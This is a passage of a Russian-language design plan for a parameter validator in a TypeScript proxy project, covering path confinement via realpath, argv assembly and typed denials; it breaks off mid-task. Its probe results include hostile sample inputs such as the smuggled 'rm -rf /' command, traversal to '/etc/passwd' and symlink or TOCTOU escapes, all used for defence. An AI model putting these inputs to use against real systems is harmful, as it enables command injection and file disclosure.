# План — E2: валидатор параметров, резолв путей, сборка argv

**Clean-code review:** passed (round 1, после правок) (2026-08-27) — 2 CRITICAL, 8 MAJOR,
3 NIT применены; спорных не осталось.

## Цель

Реализовать первую линию обороны из `spec.md`: `{recipeName, params}` → проверенные значения,
резолвнутые пути, argv-массив либо типизированный отказ. Три стадии вызова — `validate`,
`resolve_paths`, `build_argv`.

## Архитектура

Новый модуль `packages/core/src/validate/`, шесть файлов плюс тесты. Двухфазная форма:
`prepareRecipe` один раз после загрузки манифеста, `validateCall` — на каждый вызов.
Чистые функции: ни часов, ни ввода-вывода кроме `realpath`, ни записи событий.

## Стек

TypeScript 5.9.3, node ≥22 (в разработке 22.15.0), vitest 3.2.7, yarn 4.9.1 workspaces,
проектные ссылки `tsc -b`. Зависимость ровно одна: `@mcpproxy/contracts` (корневой вход).

## Глобальные ограничения

Из спеки: значение параметра не попадает в текст отказа (R25); `new RegExp` от
`Param.pattern` не вызывается (R3); argv собирается элементами, не конкатенацией (R20).

Из `tsconfig.base.json:9-13` — строгость, которая меняет то, как пишется код, а не только
то, как он проверяется:

- `strict: true`
- `noUncheckedIndexedAccess: true` — `arr[i]` даёт `T | undefined`, индексный доступ требует проверки
- `exactOptionalPropertyTypes: true` — `{ cwd: undefined }` не компилируется; необязательное
  поле ставится условным спредом
- `verbatimModuleSyntax: true` — `import type` обязателен для типов
- `module`/`moduleResolution`: `NodeNext` — расширение `.js` в каждом относительном импорте

Формат: одинарные кавычки, точки с запятой, отступ 2, висячие запятые, стрелки всегда в
скобках. Линтера в репозитории нет — эталон только `.editorconfig` и окружающий код.

---

## Пре-флайт

### 1. Путь записи — что и куда течёт

| Значение | Производитель | Преобразования | Теряет данные? |
|---|---|---|---|
| `params` вызова | внешний клиент по IPC, `packages/contracts/src/ipc.ts:72` | `Record<string, unknown>` → проверенные значения (задача 4) → резолвнутые пути (задача 5) → argv (задача 6) | да: неизвестные ключи отбрасываются отказом (R6), а не молча |
| резолвнутый путь | `fs.realpathSync` (задача 5) | realpath → confinement. Нормализации нет нигде (R17) | нет — байт в байт то, что вернул `realpath` |
| проверенные `params` | задача 5, наружу через задачу 7 | вход `argsHash`, `packages/contracts/src/audit/args.ts:19` | нет |

Резолвнутый путь — **одно** значение с одной судьбой: одна и та же строка уходит и в argv, и
в `params`, по которым считается `argsHash`. Двухветочная форма (отдельная NFC-ветка под хэш)
была отменена: она склеивала два разных пути в один апрув-идентификатор, а идентичность
относительного и абсолютного написания даёт сам `realpath` (Ф15).

`argsHash` считается по параметрам **после** валидации и резолва — это записано в самом
контракте, `packages/contracts/src/audit/args.ts:9`. Именно `realpath`, а не нормализация,
делает `{file: './logs/a.log'}` и `{file: '/abs/logs/a.log'}` одним вызовом.

### 2. Потребители — для каждого символа, который план меняет

Единственный существующий символ, который план трогает, — содержимое
`packages/core/src/index.ts`. Сейчас это `export {};`.

Пробег: `grep -rn "@mcpproxy/core" packages/ --exclude-dir=node_modules --exclude-dir=dist`

Полный список попаданий, без фильтра:

```
packages/bench/package.json:22:    "@mcpproxy/core": "workspace:*"
packages/core/package.json:2:  "name": "@mcpproxy/core",
packages/mcp-server/package.json:22:    "@mcpproxy/core": "workspace:*"
```

| Символ | Читатель | Что делает со значением | Тест читателя мокает? |
|---|---|---|---|
| `@mcpproxy/core` (весь вход) | `packages/bench/package.json:22` | только объявленная зависимость; `packages/bench/src/index.ts` не импортирует из неё ничего | нет тестов вообще |
| `@mcpproxy/core` (весь вход) | `packages/mcp-server/package.json:22` | то же | нет тестов вообще |

Ни одного импорта из `@mcpproxy/core` в коде нет: оба потребителя — заглушки `export {}`.
Поэтому расширение barrel'а не может сломать существующего читателя, и таблица §2 здесь
короткая не по недосмотру.

Ключевые символы контрактов, которые план **читает**, не меняя:

| Символ | Объявление | Что план с ним делает |
|---|---|---|
| `PatternMatcher` | `packages/contracts/src/types.ts:95` | вызывает `.test`, больше ничего — у него и нет ничего |
| `ParseManifestResult` | `packages/contracts/src/types.ts:99` | берёт поле `matchers` |
| `matcherKey` | `packages/contracts/src/types.ts:114` | строит ключ функцией, не конкатенацией |
| `Stage` | `packages/contracts/src/domain.ts:15` | три члена из тринадцати |
| `AuditEvent.argv` | `packages/contracts/src/event.ts:89` | не пишет; форму задаёт для E4 |

### 3. Инфраструктура — одна строка на пакет

| Пакет | Команда тестов | `setupFiles` | env от setup | сборка | строгость tsconfig | линтер |
|---|---|---|---|---|---|---|
| `packages/core` | **сегодня отсутствует**; заводится задачей 1 как `tsc -b && vitest run` | нет | нет | `tsc -b`, проектная ссылка на `../contracts` | наследует `tsconfig.base.json` целиком | нет |
| `packages/contracts` | `tsc -b && vitest run`, `packages/contracts/package.json:28` | нет | нет | `tsc -b` | то же | нет |

`packages/core/package.json` не имеет ключа `test`, а корневой скрипт —
`yarn workspaces foreach -Ap run test`: воркспейс без `test` **пропускается молча**. То есть
до задачи 1 любой зелёный прогон по `core` ничего не значит.

Команды верификации в задачах — `yarn workspace @mcpproxy/core test` и корневой `yarn test`.
Ни одна не несёт фильтра по имени файла, поэтому проверять фильтр через
`vitest list --filesOnly` нечего: `vitest run` без аргумента берёт весь `include`.

Существующих тестовых файлов, в которые план дописывает утверждения, нет — все тесты новые.

### 4. Форма значений в рантайме — что план распространяет и мутирует

| Значение | Загрузчик | Тип возврата | Спред допустим? |
|---|---|---|---|
| `Recipe` | `parseManifest`, `packages/contracts/src/validate/index.ts:102` | простой объект из YAML-разбора | да — он обязан быть JSON-сериализуемым, иначе `canonicalizeJcs` его не возьмёт |
| `matchers` | то же, поле результата | `ReadonlyMap`, `packages/contracts/src/types.ts:99` | **нет** — это `Map`, спред даёт массив пар, а не карту |
| `PatternMatcher` | то же | объектный литерал с единственным методом | **нет** — метод замкнут на экземпляр RE2, спред теряет замыкание не сразу, а на первом вызове |
| `params` вызова | JSON из IPC | `Record<string, unknown>` | да, но обход только через `Object.hasOwn` (R6) |

### 5. Посылки — каждое «потому что здесь верно X»

| Посылка | Пробег | Цитата | Где держится | Решение |
|---|---|---|---|---|
| Скомпилированный матчер доступен только через `parseManifest` | `node probe-contracts.mjs`, блок A | `validate exports  parseLockFile, parseManifest` | весь `./validate` — две строки, `packages/contracts/src/validate/index.ts:124` | `prepareRecipe` принимает `matchers` параметром (задача 3) |
| Матчер непрозрачен | тот же пробег, блок E | `matcher own props ["test"]` | `packages/contracts/src/types.ts:95` | воспроизвести паттерн из матчера нельзя, и это цель |
| Стадии E2 входят в оверхед | `packages/contracts/src/event.ts:149` | `OVERHEAD_EXCLUDED_STAGES` не содержит `validate`, `resolve_paths`, `build_argv` | `docs/09-metrics-and-eval.md:16` | двухфазная форма (D1), тяжёлое — на подготовке |
| Необязательное поле — отсутствующий ключ, не `null` | `packages/contracts/src/event.ts:89` | `readonly argv?: readonly string[];` | `exactOptionalPropertyTypes` в базовом tsconfig | E2 возвращает размеченный union, где `argv` есть только в успехе |

Категорические утверждения спеки и их перечисления:

- «пять типов параметров» — `string`, `enum`, `number`, `boolean`, `path`:
  `packages/contracts/src/manifest.generated.ts:14`.
- «три стадии» — `validate`, `resolve_paths`, `build_argv`:
  `packages/contracts/src/domain.ts:15-17`.
- «две строки во входе `./validate`» — `parseManifest` и реэкспорт `parseLockFile`:
  `packages/contracts/src/validate/index.ts:102` и `:124`.

### 6. Упорядоченный параметр — там, где правило ветвится на пороге

**Границы числа** (`min`, `max`), задача 4:

| Значение | Выход | Ветка |
|---|---|---|
| `min − 1` | отказ | ниже нижней границы |
| `min` | принято | граница включительна |
| `min + 1` | принято | внутри |
| `max − 1` | принято | внутри |
| `max` | принято | граница включительна |
| `max + 1` | отказ | выше верхней |

Монотонно: выход меняется ровно дважды, обе границы включительны — это то, что выражает схема
(`minimum`/`maximum`, не `exclusive*`).

**`maxLength`**, задача 4:

| Длина в кодовых точках | Выход |
|---|---|
| `maxLength − 1` | принято |
| `maxLength` | принято |
| `maxLength + 1` | отказ |

Считается по кодовым точкам (`[...s].length`), а не по `s.length`: эмодзи вне BMP занимает две
единицы UTF-16 и одну кодовую точку, поэтому два счётчика расходятся, и потолок, заданный
автором манифеста в символах, при подсчёте по `length` оказался бы вдвое строже.

**Глубина confinement**, задача 5, при `root = /r`:

| Путь после realpath | Выход | Ветка |
|---|---|---|
| `/r` | отказ | сам корень — не файл под корнем |
| `/r/a` | принято | внутри |
| `/r/a/b` | принято | внутри, глубже |
| `/r-evil/a` | отказ | сосед по префиксу |
| `/other` | отказ | снаружи |

Немонотонно по строковому префиксу — и именно поэтому предикат строится на `path.relative`,
а не на `startsWith`: по префиксу `/r-evil/a` неотличим от `/r/a`.

### 7. Выходы классификатора — ветвление по возврату существующей функции

Предикат confinement строится на `path.relative(root, resolved)`. Замерено (§8, блок 4):

| Вход | Возврат `path.relative` | Ветка | Итог |
|---|---|---|---|
| `resolved` внутри | `a/b` | не `..`, не абсолютный, не пустой | принято |
| `resolved === root` | `''` | пустой | отказ |
| сосед по префиксу | `../logs-evil/a` | начинается с `..` | отказ |
| другой том / абсолютный | абсолютный путь | `path.isAbsolute` | отказ |

Предикат: `rel !== '' && !rel.startsWith('..' + sep) && rel !== '..' && !path.isAbsolute(rel)`.

Проверка `rel !== '..'` отдельно от `startsWith('..' + sep)` — по той же причине, по которой
она стоит в `checkRootConfinement`, `packages/contracts/src/validate/refine.ts:223`: каталог
`..cache` даёт `relative` = `..cache`, и голый `startsWith('..')` объявил бы законный подкаталог
выходом за пределы.

Предикат применяется **дважды**: к лексически резолвнутому кандидату (до обращения к
файловой системе) и к результату `realpath`. Первый проход сужает оракул существования
(R15а), второй — единственный, который ловит симлинк (R13). Ни один не заменяет другой.

### 8. Проверенные факты

Все пробеги — node 22.15.0, darwin arm64, в этом воркtree. Скрипты лежат в
`docs/vibe-coding/27.08.2026-e2-validate/probes/` и воспроизводятся из корня воркtree:

```
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-path.mjs
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-contracts.mjs
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-surrogate.mjs
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-b1.mjs
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-confinement-nfc.mjs
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-prechecking.mjs
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-substitution.mjs
node docs/vibe-coding/27.08.2026-e2-validate/probes/probe-case.mjs
```

Транскрипт без скрипта в этом репозитории — та же проза: критерий готовности требует
проверки командой, а не чтением, и §8 обязана этому критерию подчиняться сама.

**Ф1. `realpath` на несуществующем пути бросает.** Пробег
`probes/probe-path.mjs`, блок 1:

```
realpathSync(missing)                              THROWS ENOENT
realpathSync(existing dir + missing leaf).dirname  /private/var/.../logs
```

Следствие: `type: path` не выражает путь для записи. Закреплено решением D4 и требованием R16.
**Не покрывает:** поведение на Linux/Windows; там `realpath` тоже бросает `ENOENT`, но
проверено не было.

**Ф2. Симлинк на каталог обходит лексическую проверку и не обходит realpath.** Блок 3:

```
lexical startsWith(root)? (i.e. naive PASSES)      true
realpath                                           /private/var/.../secret.txt
startsWith(root) after realpath?                   false
```

Это и есть И3 в исполнении: проверка «строка не содержит `..`» обходится за десять секунд.

**Ф3. Голый `startsWith` пропускает соседа по префиксу.** Блок 4:

```
naive startsWith(root) WITHOUT sep                 true
startsWith(root + sep)                             false
path.relative                                      "../logs-evil/a"
relative-based verdict says safe?                  false
```

**Ф4. `root` обязан резолвиться сам.** Блок 8:

```
root as given      /var/folders/.../logs
realpath(root)     /private/var/folders/.../logs
UNRESOLVED root would break startsWith             true
```

**Ф5. Резолвнутый путь — не стабильный дескриптор (TOCTOU).** Блок 9:

```
resolved (confined)                                true
after swap, realpath(same input)                   /private/var/.../secret.txt
resolved STRING still points where?                SECRET
```

Файл подменён на симлинк **после** успешного резолва; чтение по резолвнутой строке вернуло
содержимое из-за пределов `root`. E2 это не закрывает — закрывает `denyRead` песочницы,
который от резолва не зависит (`docs/10-honest-limitations.md:29`).
**Не покрывает:** не мерилось окно гонки и не проверялось, помогает ли `O_NOFOLLOW`.

**Ф6. macOS нечувствителен к регистру и к форме нормализации.** Блоки 5–6:

```
exists LOGS/APP.LOG ?                              true
NFC === NFD as JS strings                          false
wrote NFC; exists() under NFD?                     true
realpath(NFD) returns                              "café.log"
```

`realpath` возвращает **запрошенную** форму, а не ту, что на диске.

**Ф7. `argsHash` различает формы, файловая система — нет.** Пробег
`probes/probe-contracts.mjs`, блок B:

```
argsHash(NFC)                                  ab04a3814697c19c
argsHash(NFD)                                  7cd0efbc6814b225
SAME file on disk, same hash?                  false
```

Основание для R17. **Не покрывает:** влияние на E5 не проверялось — E5 ещё нет.

**Ф8. Одиночный суррогат роняет канонизацию, и санитайзер его не вырезает.** Блоки C–D:

```
lone surrogate       TypeError: строка содержит одиночный суррогат в позиции 4
input length / output length                   3 / 3
output still has lone surrogate?               true
=> jcs of SANITIZED text                       THROWS TypeError
```

Основание для R25 и R26: эхо значения параметра в причину отказа делает отказ незаписываемым.

**Ф9. `compilePattern` недостижим; матчер непрозрачен.** Блоки A и E:

```
validate exports        parseLockFile, parseManifest
compilePattern reachable?                      false
matcher own props ["test"]
test("v1.2.3")                                 true
test("v1.2.3; rm -rf /")                       false
```

**Ф10. Хостильные символы в пути.** Блок 7, **и одна оговорка про сам пробег**:

```
path.join(NUL) ->     ".../logs/a\0b"
  realpath            THROWS ERR_INVALID_ARG_VALUE
path.join(dotdot) ->  ".../e2probe-XXX/secret.txt"
  realpath            RETURNED
path.join(absolute) -> ".../logs/etc/passwd"
  realpath            THROWS ENOENT
path.join(empty) ->   ".../logs"
  realpath            RETURNED
```

Четыре класса, четыре ветки: нулевой байт даёт `ERR_INVALID_ARG_VALUE`, а не `ENOENT`;
`..` резолвится успешно и ловится только confinement'ом; пустая строка резолвится в сам `root`
и ловится проверкой `rel !== ''` из §7.

**Оговорка, и она существенна.** Пробег меряет `path.join`, а задача 5 использует
`path.resolve`. Для первых трёх строк подстановка нейтральна, для четвёртой — **нет**:
`join(root, '/etc/passwd')` даёт `<root>/etc/passwd` и `ENOENT`, тогда как
`resolve(root, '/etc/passwd')` даёт `/etc/passwd`, то есть выход за границу
(замерено в `probes/probe-case.mjs`). Ветка проектируется по семантике `resolve`:
абсолютное значение перебивает корень и ловится confinement'ом, а не отсутствием файла.
Строка оставлена в отрывке именно потому, что раньше была из него убрана — а это ровно та,
где расхождение и живёт.

**Ф19. Регистр сегмента корня даёт ложный отказ; регистр листа — лишний апрув.**
Пробег `probes/probe-case.mjs`:

```
запрошено                         <base>/LOGS/a.log
файл доступен?                    true
realpath вернул                   /private/<base>/LOGS/a.log
realRoot                          /private/<base>/logs
path.relative(realRoot, resolved) "../LOGS/a.log"
confinement пропускает?           НЕТ — ложный отказ

регистр ЛИСТА: confinement пропускает?      да
argsHash(a.log) === argsHash(A.LOG)?        false
```

Основание для строки в таблице ограничений. `realpath` возвращает **запрошенный** регистр
(это же показывает Ф6), поэтому отличие регистра в сегменте корня выглядит для `relative`
выходом за границу, хотя файл лежит внутри и доступен. Чинить нормализацией регистра нельзя:
это вернуло бы коллизию, ради устранения которой переписан R17. Отказ в безопасную сторону,
поэтому записывается, а не закрывается.

**Ф11. Матчер не бросает на враждебной строке, и зачистка суррогатов обратима для пар.**
Пробег `probes/probe-surrogate.mjs`:

```
обычная строка                                     вернул true
одиночный высокий суррогат                         вернул false
одиночный низкий суррогат                          вернул false
нулевой байт                                       вернул false
пустая строка                                      вернул true
.length (единицы UTF-16)                           4
[...s].length (кодовые точки)                      3
одиночный высокий суррогат -> после зачистки       "ab"  jcs принял
корректная пара (эмодзи) -> после зачистки         "a😀b"  jcs принял
пара переживает зачистку?                          true
```

Три следствия. Первое: `matcher.test` возвращает `false`, а не бросает, поэтому проверка
паттерна безопасна первой и спецобработки не требует. Второе: пустая строка **проходит**
`^[\w./-]{0,64}$`, потому что `{0,64}` допускает ноль — поведение автора манифеста, и оно
должно быть закреплено тестом, иначе окажется случайным. Третье: регулярка зачистки
вырезает одиночные суррогаты обеих половин и **сохраняет корректную пару**.
**Не покрывает:** поведение `re2` на других платформах. И, важнее, **не покрывает** вывод
«матчер отбивает суррогаты» — см. Ф12: это свойство конкретного паттерна, а не матчера.

**Ф12. Законный паттерн манифеста пропускает значение, которое роняет запись аудита.**
Пробег `probes/probe-b1.mjs`:

```
RE2(^.{0,64}$).test(lone)                            true
RE2(^[\s\S]{0,64}$).test(lone)                       true
RE2(^[\w./-]{0,64}$).test(lone)                      false
canonicalizeJcs({argv:[lone]})                       БРОСИЛ TypeError: строка содержит одиночный суррогат
argsHash("run_tests",{pattern:lone})                 БРОСИЛ TypeError: строка содержит одиночный суррогат
нулевой байт                                         RE2=true  jcs ок
bidi RLO                                             RE2=true  jcs ок
```

Основание для R28, и это **дыра на успешном пути**, а не на отказе: `^.{0,64}$` — законный
паттерн, `parseManifest` его принимает, RE2 компилирует, и на одиночном суррогате он даёт
`true`. Дальше значение едет в argv, а `chainHash` и `argsHash` бросают — вызов разрешён,
событие записать нельзя. Слабый паттерн объявлен принятым ограничением
(`docs/10-honest-limitations.md:27`), поэтому полагаться на автора манифеста нельзя.

Последние две строки задают форму гейта: нулевой байт и bidi канонизацию **переживают**.
Значит проверять надо именно пригодность к канонизации, а не «враждебные символы» вообще —
иначе гейт отвергнет законные значения.

**Ф13. `realpath` возвращает имя файла дословно, включая bidi; санитайзеры дополняют друг
друга.** Тот же пробег:

```
realpath вернул имя с bidi?                          "we‮lgnp.txt"
содержит \p{Cf}?                                     true
realpath(одиночный суррогат)                         БРОСИЛ ENOENT
sanitizeDescription режет Cf?                        true
sanitizeDescription режет Cs?                        false
Object.keys(null)                                    БРОСИЛ TypeError
String(1e21)                                         1e+21
path.resolve(root, 42)                               БРОСИЛ ERR_INVALID_ARG_TYPE
```

Основание сразу для четырёх решений. R27: `sanitizeDescription` режет `Cf`, но не `Cs`,
собственная зачистка — наоборот, поэтому нужны обе. R26: bidi-override из имени файла,
созданного внутри разрешённого каталога, доезжает до текста отказа дословно и уходит в UI.
R29: `Object.keys(null)` бросает, то есть контейнер обязан проверяться по форме. Плюс две
ветки задач 4 и 5 — `String(1e21)` даёт `'1e+21'`, а `path.resolve` с не-строкой бросает
`ERR_INVALID_ARG_TYPE`, и обе эти ветки надо назвать, а не оставить компилятору.

Побочно: `realpath` на одиночном суррогате бросает `ENOENT` — то есть в резолвнутом пути
суррогата быть не может. Прежняя формулировка R27 угадала это верно, но по неназванной
причине; теперь причина замерена.

**Ф14. Предпроверка против нерезолвнутого корня отвергает законный путь.**
Пробег `probes/probe-confinement-nfc.mjs`:

```
лексический root       /var/folders/.../e2r2-XXX/logs
realpath(root)         /private/var/folders/.../e2r2-XXX/logs
значение в realpath-форме  /private/var/folders/.../e2r2-XXX/logs/a.log
relative(лексич.root, realForm)  "../../../../../../../private/var/.../logs/a.log"
предпроверка против ЛЕКСИЧ. корня   ОТКАЗ (ложный!)
предпроверка против REALPATH корня  пропустила (верно)
относительное значение против лексич.  пропустила
```

Основание для порядка шагов в задаче 5: `realpath` корня обязан идти **до** предпроверки.
Последняя строка объясняет, почему дефект мог бы уехать в реализацию: относительное значение
проходит и при нём, а все прежние трейсы подавали именно относительное. Значение же в
realpath-форме — это ровно то, что E2 сам кладёт в argv и в событие, то есть то, что модель
перешлёт обратно, прочитав аудит.

**Ф15. NFC склеивает два разных пути в один `argsHash`, а нужный эффект даёт сам `realpath`.**
Тот же пробег:

```
argsHash(NFC-путь)             c9eef226b252e3a1
argsHash(NFD-путь после NFC)   c9eef226b252e3a1
=> два ПУТИ дают один хэш      true
без нормализации: хэши различны  true
realpath("./a.log")            /private/var/.../logs/a.log
realpath(абсолютный)           /private/var/.../logs/a.log
argsHash совпадает без всякого NFC  true
```

Основание для разворота D5 и переписанного R17. Верхний блок — цена нормализации: на
файловой системе с байтовыми именами это два разных файла, и апрув со `scope: recipe_and_args`,
выданный на один, авторизует другой. Нижний — её бесполезность: идентичность относительного и
абсолютного написания, ради которой всё и затевалось, даёт `realpath` без чьей-либо помощи.
**Не покрывает:** поведение на самой байтовой ФС не проверялось — вывод о двух файлах следует
из семантики имён, а не из замера на ext4.

**Ф16. Запрещающая предпроверка отвергает законные пути при любом выборе корня; советующая —
не отвергает и всё равно схлопывает оракул.** Пробег `probes/probe-prechecking.mjs`:

```
законное значение (лексич. форма)   /var/folders/.../logs/a.log
ПРЕДПРОВЕРКА (шаг 3)                ОТКАЗ (ложный!)
пост-проверка (шаг 5)               пропустила => путь ЗАКОННЫЙ

значение через симлинк-каталог      /var/folders/.../alias/a.log
ПРЕДПРОВЕРКА (шаг 3)                ОТКАЗ (ложный!)
пост-проверка (шаг 5)               пропустила => ЗАКОННЫЙ

--- советующая форма ---
законный относительный              ПРИНЯТ
законный лексической формы          ПРИНЯТ
законный через симлинк              ПРИНЯТ
обход, цель СУЩЕСТВУЕТ              path-escapes-root
обход, цели НЕТ                     path-escapes-root
обход глубокий, цели нет            path-escapes-root

значение с суррогатом               БРОСИЛ TypeError
КЛЮЧ с суррогатом                   БРОСИЛ TypeError
```

Первые два блока — зеркало Ф14 и общая формулировка дефекта: лексический предикат симлинков
не видит, поэтому **любой** законный файл внутри `root`, достигнутый через симлинк, им
отвергается. Перестановка корня в прошлом раунде дефект переместила, а не убрала.

Третий блок — основание для советующей формы R15а: три законных написания приняты, три обхода
дают один код.

Последние две строки — основание для расширения R28: канонизация проверяет **ключи** объекта,
а не только значения, поэтому имена параметров и `recipeName` попадают в тот же сток, что и
значения.

**Ф17. `String.replace` интерпретирует замену; законное имя файла ломается.**
Пробег `probes/probe-substitution.mjs`:

```
replace  "--file={}" + "/root/a$`b"  "--file=/root/a--file=b"
  split/join                         "--file=/root/a$`b"
replace  "{}" + "/root/a$'b"         "/root/ab"
  split/join                         "/root/a$'b"
replace  "{}" + "/root/a$&b"         "/root/a{}b"

файл создан                        true
realpath                           /private/var/.../a$'b.log
argv наивно                        "/private/var/.../ab.log"
argv безопасно                     "/private/var/.../a$'b.log"
совпадают?                         false
```

Основание для R20а. Второй блок важнее первого: это **существующий** файл, прошедший
confinement, и наивная подстановка даёт argv с другим, несуществующим путём. То есть дефект
проявляется на законном имени, а не только как вектор атаки.

**Ф18. Оракул существования схлопнут только для лексической спелляции.** Тот же пробег:

```
лексический обход, цель есть       preOk=false  path-escapes-root
лексический обход, цели нет        preOk=false  path-escapes-root
СИМЛИНК внутри root -> есть        preOk=true   path-escapes-root
СИМЛИНК внутри root -> нет         preOk=true   path-not-found
показанный путь при escape         /private/etc/passwd
```

Основание для переписанного R15а и для двух строк в таблице ограничений. Симлинк, созданный
внутри `root`, лексически лежит внутри, предпроверка проходит, и различие кодов возвращается.
Прежняя формулировка «бит наружу не уходит» была неверна; верная — «уходит дороже и с
записью в аудит на каждый созданный симлинк».

Последняя строка — вторая, независимая утечка: текст отказа называет резолвнутую цель, и это
не дефект, а требование S4. Записано в ограничениях как осознанная плата.

---

## Задачи

### Задача 1 — тест-раннер пакета `core`

Реализует R34.

**Files:**
- Modify: `packages/core/package.json`
- Create: `packages/core/vitest.config.ts`
- Create: `packages/core/src/harness.test.ts`

**Шаги:**

1. В `packages/core/package.json` добавить `"test": "tsc -b && vitest run"` в `scripts`,
   а в `devDependencies` — `"vitest": "^3"`, `"es-module-lexer": "^2"` и `"@types/node": "^22"`.
   Все три объявляются явно, хотя сегодня разрешились бы и без этого: при
   `nodeLinker: node-modules` они захойстены в корень, то есть гарантия R1 и типизация
   `node:fs`, `node:path` и `process.hrtime.bigint` держались бы на devDependency соседнего
   пакета и корня. Довод один и тот же, поэтому и решение одно.
2. Префикс `tsc -b` в `test` нужен не этой задаче, а задаче 9: `deps.test.ts` читает `dist`.
   `harness.test.ts` читает исходники и `dist` как раз исключает.
3. Создать `packages/core/vitest.config.ts` по образцу `packages/contracts/vitest.config.ts`:

```ts
import { defineConfig } from 'vitest/config';

export default defineConfig({
  test: {
    environment: 'node',
    include: ['src/**/*.test.ts'],
  },
});
```

4. Создать `packages/core/src/harness.test.ts` с двумя утверждениями по образцу
   `packages/contracts/src/domain.test.ts:47-65`: найден хотя бы один тестовый файл, и ни один
   тестовый файл не лежит за пределами `src/`.

**Falsification:** раннер отсутствует → `yarn workspace @mcpproxy/core test` завершается
ошибкой «Command not found», observable — ненулевой код возврата; раннер есть → прогон
показывает ≥1 файл и ≥2 теста. Тест «нет тестов за пределами src» проверяется временным
созданием тестового файла на уровень выше `src` — с ним список непустой и утверждение
краснеет; файл удаляется сразу после проверки.

**Runtime:** node, `environment: 'node'`. Тест читает файловую систему через
`readdirSync(..., { recursive: true })` — доступна с node 18.17, у нас ≥22.

**Verify:** `yarn workspace @mcpproxy/core test`

**Commit:** `E2: тест-раннер пакета core — до этого yarn test пропускал его молча`

---

### Задача 2 — общие типы, словарь отказов, канонизируемость

Реализует R23, R24, R27, R28 (предикат), R30, R30а (константы).

**Files:**
- Create: `packages/core/src/validate/denial.ts`
- Create: `packages/core/src/validate/denial.test.ts`

**Interfaces:**

```ts
export type ParamValue = string | number | boolean;

export const E2_STAGES = ['validate', 'resolve_paths', 'build_argv'] as const satisfies readonly Stage[];

export type E2Stage = (typeof E2_STAGES)[number];

export const DENIAL_STAGES = ['validate', 'resolve_paths'] as const satisfies readonly E2Stage[];

export type DenialStage = (typeof DENIAL_STAGES)[number];

export const VALUE_MAX_CODE_POINTS = 4096;

export const DENIALS_MAX = 32;

declare const validated: unique symbol;
declare const resolved: unique symbol;

export type ValidatedValues = ReadonlyMap<string, ParamValue> & { readonly [validated]: true };

export type ResolvedValues = ReadonlyMap<string, ParamValue> & { readonly [resolved]: true };

export const DENIAL_CODES = [
  'bad-params-container',
  'unknown-param',
  'missing-required',
  'wrong-type',
  'not-canonicalizable',
  'value-oversized',
  'pattern-mismatch',
  'too-long',
  'not-in-enum',
  'not-finite',
  'out-of-range',
  'not-integer',
  'path-not-found',
  'path-escapes-root',
  'path-unusable',
  'denials-truncated',
] as const;

export type DenialCode = (typeof DENIAL_CODES)[number];

export interface Denial {
  readonly stage: DenialStage;
  readonly code: DenialCode;
  readonly paramName: string | null;
  readonly reason: string;
}

export function denial(input: {
  stage: DenialStage;
  code: DenialCode;
  paramName: string | null;
  reason: string;
}): Denial;

export function isCanonicalizable(value: string): boolean;
```

**Шаги:**

1. `E2_STAGES` и `DENIAL_STAGES` объявляются массивами с `as const satisfies`, а не
   инлайновым `Extract`. Разница исполняемая: `Extract<Stage, 'validaet'>` даёт `never`
   молча и всё остальное продолжает компилироваться, а `satisfies readonly Stage[]` роняет
   сборку на опечатке. Идиом уже стоит в `packages/contracts/src/domain.test.ts:25`.
2. `DENIAL_STAGES` уже `E2_STAGES`: `buildArgv` тотальна, отказать ей нечем, поэтому
   `build_argv` в стадии отказа недостижим. `E2Stage` остаётся широким — длительность
   меряется у всех трёх.
3. `paramName: string | null`, где `null` значит «претензия к самому запросу, а не к
   параметру» — единственный такой код `bad-params-container`. `null` здесь ровно в том
   смысле, который контракт ему приписывает: известно и пусто.
4. Объявить `DENIAL_CODES` массивом с JSDoc на каждом члене — форма из
   `packages/contracts/src/validate/branch-checks.ts:17`, где массив выбран ради двусторонней
   переписи.
5. Конструктор `denial` принимает **объектный** аргумент. Позиционная форма ставит рядом
   `paramName` и `reason`, оба строковые; их перестановка компилируется и кладёт прозу в имя,
   а имя — в причину, ровно в том единственном месте, где значение может проехать мимо R25.
6. Конструктор пропускает **оба** строковых поля через **две** зачистки подряд:
   `sanitizeDescription` из корневого входа контрактов (`packages/contracts/src/tool.ts:74`)
   и собственную зачистку одиночных суррогатов. Обе обязательны и не заменяют друг друга —
   замерено (Ф13): `sanitizeDescription` режет `Cc`/`Cf` и ANSI, но суррогаты оставляет;
   собственная режет суррогаты, но не `Cf`. Импорт из корневого входа не тянет зависимостей.
7. `paramName` санитизируется наравне с `reason`, а не «на всякий случай»: он недоверен ровно
   в коде `unknown-param`, где берётся из ключей **запроса**. Имена манифеста ограничены
   `propertyNames` схемы, ключи запроса — нет, и R6 это подчёркивает.
8. `isCanonicalizable(value)` — предикат «строка переживёт `canonicalizeJcs`». Реализуется
   проверкой на непарные суррогаты, а не вызовом `canonicalizeJcs` в `try/catch`: предикат
   зовётся на каждое строковое значение каждого вызова, и городить исключение на горячем
   пути ради булева ответа дорого. Эквивалентность двух реализаций фиксируется тестом.
9. `ValidatedValues` и `ResolvedValues` — две **различимые** формы одной карты, брендированные
   уникальными символами. Обе стираются в `ReadonlyMap<string, ParamValue>` в рантайме, цены
   нет. Чеканятся ровно в двух местах — на выходе `validateParams` и на выходе `resolvePaths`,
   — и каждое требует двойного каста (`as unknown as ValidatedValues`): одинарный отвергается
   как недостаточно перекрывающийся. Оба места названы здесь, чтобы касты не расплодились. Нужны потому, что на шве фасада обе карты существуют одновременно, а без бренда они
   одного типа: передать в `buildArgv` **до**резолвную карту — то есть сырую непроверенную
   строку прямо в argv — компилятор молча позволит. Это самый security-критичный шов плана, и
   держать его одним рантайм-трейсом при том, что задача 3 требует типовой замкнутости для
   куда более слабых инвариантов, непоследовательно.

10. `DENIALS_MAX = 32` — потолок на длину списка отказов (R30а). Значение выбрано так, чтобы
   человек в модалке мог их прочитать: список длиннее уже не диагностика, а стена текста.

11. `VALUE_MAX_CODE_POINTS` — абсолютный потолок длины строкового значения (R30), независимый
   от `maxLength` манифеста. Нужен потому, что `PathParam` не имеет ни `pattern`, ни
   `maxLength` вовсе, то есть без него путь в мегабайт доедет до `realpath`, argv, `argsHash`
